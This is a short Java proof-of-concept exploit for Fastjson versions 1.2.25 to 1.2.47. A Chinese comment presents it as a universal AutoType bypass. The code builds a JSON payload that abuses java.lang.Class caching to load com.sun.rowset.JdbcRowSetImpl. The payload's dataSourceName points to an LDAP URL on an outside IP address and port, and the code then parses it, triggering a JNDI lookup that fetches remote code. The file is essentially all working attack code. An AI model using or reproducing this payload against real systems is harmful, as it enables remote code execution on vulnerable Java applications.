package JdbcRowSetImpl;

import com.alibaba.fastjson.JSON;
/*1.2.25-1.2.47通杀
为什么说这里标注为通杀呢，其实这里和前面的绕过方式不太一样，这里是可以直接绕过 AutoTypeSupport ，即便关闭 AutoTypeSupport 也能直接执行成功。。*/
public class exp3 {
    public static void main(String[] args) {
        String PoC = "{\n" +                "    \"a\":{\n" +                "        \"@type\":\"java.lang.Class\",\n" +                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +                "    },\n" +                "    \"b\":{\n" +                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +                "        \"dataSourceName\":\"ldap://101.34.84.157:8085/zPnvpHcF\",\n" +                "        \"autoCommit\":true\n" +                "    }\n" +                "}";
        System.out.println(PoC);
        JSON.parse(PoC);
    }
}

